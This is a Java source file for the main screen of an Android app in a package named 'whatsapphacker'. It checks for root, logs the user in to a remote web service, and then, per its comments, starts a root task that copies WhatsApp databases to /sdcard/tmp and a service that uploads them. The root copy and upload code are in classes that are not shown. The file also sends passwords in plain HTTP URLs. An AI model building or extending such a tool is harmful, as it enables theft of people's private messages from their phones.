package com.electricdroid.whatsapphacker;

import android.app.Dialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;


public class MainActivity extends ActionBarActivity {
    private String username;
    private EditText usernameEdit;
    private EditText passwordEdit;
    private TextView errorView;
    private Button submitBtn;
    private Dialog dialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        dialog= new Dialog(this);




        boolean gotRoot = ExecuteAsRootBase.canRunRootCommands();
        if (!gotRoot) {
            Toast.makeText(this, "This App will not work on unrooted Phone Sorry", Toast.LENGTH_LONG).show();
            //  finish();
        }

        //what to do?
       /* 1. find if user in shared prefs ,goto uploadService but before that PutDb ,else show reg activity ie this activity.
        2.  redirect to uploadservice
        3 . i'm not deleting the dbs as service will be using that
        */
        // startService(new Intent(this, UploaderService.class));

        final SharedPreferences sharedPreferences = getSharedPreferences("myprefs", MODE_PRIVATE);
        //key is username
       if (sharedPreferences.getString("username", null) == null) {
            //start a dialog for username password register or login
            dialog.show();
           dialog.setCanceledOnTouchOutside(false);
           dialog.setContentView(R.layout.user_dialog);
           dialog.setTitle("Login or Register: ");
           usernameEdit = (EditText) dialog.findViewById(R.id.username_edit);
           passwordEdit = (EditText) dialog.findViewById(R.id.password_edit);
           errorView = (TextView) dialog.findViewById(R.id.username_status);
           submitBtn = (Button) dialog.findViewById(R.id.submit_btn);
           usernameEdit.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence s, int start, int count, int after) {

                }

                @Override
                public void onTextChanged(CharSequence s, int start, int before, int count) {

                }

                @Override
                public void afterTextChanged(Editable s) {
                    //we will see if user available/registered here?
                    //if available we will say already registered put password
                    String username = usernameEdit.getText().toString();
                    String userchkurl = "http://" + getResources().getString(R.string.server_address) + "/WAWebService/rest/WAService/isUserExist/" + username;
                    new CheckUserAsync().execute(new String[]{userchkurl});
                }
            });


            submitBtn.setOnClickListener(new View.OnClickListener() {
                String user = null;
                String pass = null;

                @Override
                public void onClick(View v) {

                    if (usernameEdit.getText() != null && usernameEdit.getText().length() > 0) {
                        user = usernameEdit.getText().toString();
                    }
                    if (passwordEdit.getText() != null && passwordEdit.getText().length() > 0) {
                        pass = passwordEdit.getText().toString();
                    }

                    String chkIfRegisteredUrl = "http://" + getResources().getString(R.string.server_address) + "/WAWebService/rest/WAService/isUserRegistered/" + user + "/" + pass;
                    RegisterUserAsync registerUserAsync = new RegisterUserAsync();
                    registerUserAsync.execute(new String[]{chkIfRegisteredUrl, user, pass});

                }
            });

        } else {
            username = sharedPreferences.getString("username", null);
            ExecuteAsRoot ex = new ExecuteAsRoot(username);
            ex.execute(); //now we got the db in /sdcard/tmp
            //now we will upload it
            Intent intent = new Intent(this, UploaderService.class);
            startService(intent);


       }

    }

    private class CheckUserAsync extends AsyncTask<String,Void, String>{

        @Override
        protected String doInBackground(String... params) {
            return getResponseText(params[0]);
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            JSONObject jsonObject = null;
            boolean status = false;
            try {
                jsonObject = new JSONObject(s);

                status = jsonObject.getBoolean("status");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            if (!status) {
                //if status isnot true ie user name is not registered
                errorView.setVisibility(View.VISIBLE);
                errorView.setText("You are Good to go,Username available");
            } else {
                errorView.setVisibility(View.VISIBLE);
                errorView.setText("User already Registered,put password: ");
            }
        }
    }


    private class RegisterUserAsync extends AsyncTask<String,Void,Integer>{
        @Override
        protected Integer doInBackground(String... params) {
            Log.d("anki","REg user async start");
            Integer tostType= -1;
            SharedPreferences sharedPreferences = getSharedPreferences("myprefs", MODE_PRIVATE);
            boolean statusIsRegistered = false;
            //param0 is url for chk if user is already reg
            //param1 is username
            //param2 is password
            try {
                String responseiIsUserPreRegistered = getResponseText(params[0]);
                JSONObject jsonObject = new JSONObject(responseiIsUserPreRegistered);
                statusIsRegistered = jsonObject.getBoolean("status");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            if (statusIsRegistered) {
                Log.d("anki","if registered part");
                //if he is already registered,login him
                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("username", params[1]);
                editor.commit();

                tostType = 1;
               //tosttype=1 Toast.makeText(MainActivity.this,"User already Registered,Saving credentials",Toast.LENGTH_LONG).show();
            } else {
                Log.d("anki","add new user");
                //add the user or say him to change user/pass if unable to inser new user
                //bacause of username is already registered
                boolean statusInsertUser = false;
                String insertUserUrl = "http://" + getResources().getString(R.string.server_address) + "/WAWebService/rest/WAService/insertUser/" + params[1] + "/" + params[2];

                try {
                    String responseiIsUserPreRegistered = getResponseText(insertUserUrl);
                    JSONObject jsonObject = new JSONObject(responseiIsUserPreRegistered);
                    statusInsertUser = jsonObject.getBoolean("status");
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                if (statusInsertUser) {
                    //now if user inserted login him by saving in sharedprefs
                    tostType =2;
                   //tosttype=2 Toast.makeText(MainActivity.this, "user Registered,Logging in", Toast.LENGTH_LONG).show();
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putString("username", params[1]);
                    editor.commit();
                } else {
                    tostType = 3;
                    //tosttype=3  Toast.makeText(MainActivity.this, "Username already Registered and Password doesnt Match,try again!", Toast.LENGTH_LONG).show();

                }
            }
           // returns status for displaying toasts 1,2,3 ..if problem then -1(default)
            return  tostType;
        }

        @Override
        protected void onPostExecute(Integer integer) {
            super.onPostExecute(integer);
            if(integer==1){
                dialog.dismiss();
                Toast.makeText(MainActivity.this,"User already Registered,Saving credentials",Toast.LENGTH_LONG).show();
            }else if(integer == 2){
                dialog.dismiss();
                Toast.makeText(MainActivity.this, "user Registered,Logging in", Toast.LENGTH_LONG).show();
            }else if(integer == 3){
                Toast.makeText(MainActivity.this, "Username already Registered and Password doesnt Match,try again!", Toast.LENGTH_LONG).show();
            }
            SharedPreferences sharedPreferences =getSharedPreferences("myprefs", MODE_PRIVATE);
            username = sharedPreferences.getString("username", null);
            Log.d("anki","logging username in main activity last: "+username);
            if(username !=null) {
                ExecuteAsRoot ex = new ExecuteAsRoot(username);
                ex.execute(); //now we got the db in /sdcard/tmp
                //now we will upload it
                Intent i = new Intent(MainActivity.this, UploaderService.class);
                startService(i);

            }
        }
    }

    private String getResponseText(String stringUrl)  {
        StringBuilder response = new StringBuilder();

        URL url = null;
        try {
            url = new URL(stringUrl);
        } catch (MalformedURLException e) {
            Log.e("error",e.getMessage());
        }
        HttpURLConnection httpconn=null;
        try {
           httpconn= (HttpURLConnection) url.openConnection();
            if (httpconn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                BufferedReader input = new BufferedReader(new InputStreamReader(httpconn.getInputStream()));
                String strLine = null;
                while ((strLine = input.readLine()) != null) {
                    response.append(strLine);
                }
                input.close();
            }

        }catch (IOException e){
            Log.e("error",e.getMessage());
        }
        finally {
           httpconn.disconnect();
        }
        return response.toString();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


}
